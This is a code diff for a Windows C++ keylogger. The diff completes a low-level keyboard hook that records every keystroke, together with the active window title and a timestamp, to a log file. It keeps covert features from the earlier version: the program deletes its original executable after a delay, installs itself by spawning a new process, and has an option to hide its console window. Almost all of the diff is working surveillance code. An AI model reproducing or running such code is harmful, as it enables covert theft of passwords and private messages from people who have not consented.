@@ -6,6 +6,7 @@
 #include <Shlobj_core.h>
 #include <iostream>
 #include <fstream>
+#include <sstream>
 
 using namespace std;
 
@@ -13,11 +14,13 @@ using namespace std;
 #define LOG_FILE L"keyboard.log"
 
 HHOOK keyboardHook;
-HANDLE  hFile;
+//HANDLE  hFile;
+ofstream logFile;
 
+void logToFile(int vkCode);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void install();
-void hook();
+void setHook();
 
 int main(int argc, char** argv) {
 
@@ -29,10 +32,13 @@ int main(int argc, char** argv) {
 
 	Sleep(10000);
 	DeleteFileA(argv[1]);
+	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // if 0, invisible window; if 1, visible window
+
+	/*
 
 	hFile = CreateFile(LOG_FILE,                // name of the write
-		GENERIC_WRITE| GENERIC_READ,          // open for writing
-		FILE_SHARE_READ,                      
+		GENERIC_WRITE,          // open for writing
+		FILE_SHARE_READ,
 		NULL,                   // default security
 		CREATE_ALWAYS,             // create new file, always; if exists and is writable, overwrites the file
 		FILE_ATTRIBUTE_HIDDEN,  // hidden file
@@ -43,10 +49,25 @@ int main(int argc, char** argv) {
 		printf("Cant create file log\n");
 		return 1;
 	}
-	hook();
+	printf("Create file successful\n");
 
+	*/
 
-	CloseHandle(hFile);
+	//open in appending mode
+	logFile.open(LOG_FILE, ofstream::app);
+
+	/*
+	if (SetConsoleCtrlHandler(CtrlHandler, true)) {
+
+		printf("Couldnt set control handle\n");
+
+	}
+	else {
+
+		setHook();
+	}*/
+	setHook();
+	logFile.close();
 	return 0;
 
 }
@@ -131,13 +152,14 @@ void install() {
 		printf("Cant create process\n");
 		return;
 	}
+	CloseHandle(procInfo.hProcess);
+	CloseHandle(procInfo.hThread);
 }
 
-void hook() {
+void setHook() {
 
 	//keyboard handle
-	keyboardHook = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)LowLevelKeyboardProc, (HINSTANCE)NULL, NULL);
-	if (!(keyboardHook = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)LowLevelKeyboardProc, (HINSTANCE)NULL, NULL)) {
+	if ( !(keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, (HINSTANCE)NULL, NULL)) ) {
 
 		printf("Set window hook failed\n");
 		return;
@@ -150,13 +172,150 @@ void hook() {
 		DispatchMessage(&msg);
 	}
 	UnhookWindowsHookEx(keyboardHook);
-	//close handle file
-
 
 }
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
-	//callNextHookEx
+	
 	//wParam case = KEY_DOWN -> log to file
+	//callNextHookEx
+	if (nCode >= 0) {
+		if (wParam == WM_KEYDOWN) {
 
+			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+			logToFile(p->vkCode);
+
+		}
+
+	}
+	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+	
 }
+
+
+void logToFile(int vkCode) {
+
+	if (vkCode == 1 || vkCode == 2) {		//ignore mouse clicks
+
+		return;
+	}
+	//get window title
+	HWND fg = GetForegroundWindow();
+
+	if (!fg) {
+
+		printf("GetForegroundWindow failed\n");
+		return;
+	}
+	
+	char currentWin[256] = { 0 };
+	static char lastWin[256] = { 0 };
+	char dateFormat[20] = { 0 };
+	char timeFormat[20] = { 0 };
+	stringstream output;
+
+	GetWindowTextA(fg, currentWin, 256);
+	
+	if ( strcmp(currentWin, lastWin) != 0 ) {   //if new window then 
+		
+		StringCchCopyA(lastWin, 256, currentWin);
+
+		//get and format [time][windowTitle]
+		SYSTEMTIME currentTime;
+		GetLocalTime(&currentTime);
+		GetDateFormatA(LOCALE_CUSTOM_DEFAULT, NULL, &currentTime, "dd/MM/yy", dateFormat, 20);
+		GetTimeFormatA(LOCALE_CUSTOM_DEFAULT, NULL, &currentTime, "HH:mm:ss", timeFormat, 20);
+
+		output << "\n[" << dateFormat << " " << timeFormat << "] [" << currentWin << "] ";
+	}
+
+	switch (vkCode)
+	{
+	case VK_BACK:
+		output << "[backspace]";
+		break;
+	case VK_RETURN:
+		output << "\n";
+		break;
+	case VK_SPACE:
+		output << " ";
+		break;
+	case VK_TAB:
+		output << "[tab]";
+		break;
+	case VK_SHIFT:
+		output << "[shift]"; 
+		break;
+	case VK_LSHIFT:
+		output << "[shift]";
+		break;
+	case VK_RSHIFT:
+		output << "[shift]";
+		break;
+	case VK_CONTROL:
+		output << "[ctrl]";
+		break;
+	case VK_LCONTROL:
+		output << "[ctrl]";
+		break;
+	case VK_RCONTROL:
+		output << "[ctrl]";
+		break;
+	case VK_MENU:
+		output << "[alt]";
+		break;
+	case VK_LWIN:
+		output << "[win]";
+		break;
+	case VK_CAPITAL:
+		output << "[caplock]";
+		break;
+	case VK_ESCAPE:
+		output << "[esc]";
+		break;
+	case VK_END:
+		output << "[end]";
+		break;
+	case VK_HOME:
+		output << "[home]";
+		break;
+	case VK_LEFT:
+		output << "[left]";
+		break;
+	case VK_RIGHT:
+		output << "[right]";
+		break;
+	case VK_UP:
+		output << "[up]";
+		break;
+	case VK_DOWN:
+		output << "[down]";
+		break;
+	case VK_PRIOR:
+		output << "[pg up]";
+		break;
+	case VK_NEXT:
+		output << "[pg dn]";
+		break;
+	case VK_DECIMAL:
+		output << ".";
+		break;
+	case VK_SUBTRACT:
+		output << "-";
+		break;
+	case VK_ADD:
+		output << "+";
+		break;
+	default:
+		char c = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
+		output << c;
+		break;
+	}
+
+	logFile << output.str();
+	cout << output.str();
+	//keep file open 
+	logFile.flush();
+	
+}
+
